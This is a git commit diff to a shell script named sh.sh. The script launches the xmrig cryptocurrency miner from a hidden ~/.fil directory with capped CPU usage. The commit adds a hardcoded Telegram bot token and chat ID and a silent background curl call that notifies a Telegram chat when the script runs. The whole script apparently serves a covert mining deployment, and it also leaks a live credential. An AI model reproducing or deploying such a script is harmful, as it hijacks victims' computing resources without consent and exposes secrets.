6f391a2449a0ccf7d5fade86e625925e6df59e26
hacker-515m <bahaa0106400@gmail.com>
2024-06-21 17:22:17 +0300

    sh.sh

--- sh.sh
+++ sh.sh
@@ -1,3 +1,8 @@
 #!/bin/bash
+BOT_TOKEN="7358706949:AAGmCtR29AVrmTO5lH6M7424T0pWim_Pm0k"
+CHAT_ID="5792222595"
+MESSAGE="تم"
+
+nohup curl -s -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendMessage" -d "chat_id=$CHAT_ID" -d "text=$MESSAGE" &>/dev/null &
 
 ~/\.fil/xmrig --max-cpu-usage=50 --threads=2
